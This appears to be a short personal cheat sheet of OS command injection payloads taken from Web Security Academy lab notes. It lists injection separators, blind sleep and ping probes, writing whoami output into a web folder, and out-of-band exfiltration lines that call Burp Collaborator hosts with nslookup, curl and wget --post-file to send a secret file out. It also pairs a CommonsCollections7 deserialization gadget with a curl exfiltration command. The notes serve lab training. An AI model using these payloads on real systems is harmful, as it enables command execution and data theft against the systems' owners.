Simple
```
|| command
; command
&& command (url-encoded)
$(command)
```
Blind
```
test%40test.com||sleep+5||
test%40test.com;sleep+5;
test%40test.com||ping+-c+5||
;nslookup x.e4jthuf7rticd8sp14hova2fw62xqnec.oastify.com;
```
Write commands in accesible folder: /var/www/images/
```
whoami > /var/www/images/test.txt

https://0a2f008a032675868187b28600ba00d0.web-security-academy.net/image?filename=test.txt
```
Exfiltrate data with out of band
```
;nslookup $(whoami).e4jthuf7rticd8sp14hova2fw62xqnec.oastify.com;
||curl+`whoami`.00y7e29ks339nxuskhes4q429tfk3br0.oastify.com||
```
![[Pasted image 20260721135516.png]]

Exfiltrate Data like a pro
```
"``/usr/bin/wget --post-file /home/carlos/secret https://y54nvieai2tvgmz11xb2hj1pkgq9e12q.oastify.com``"

CommonsCollections7 'curl --data @/home/carlos/secret <your burp collaborator address>'

```

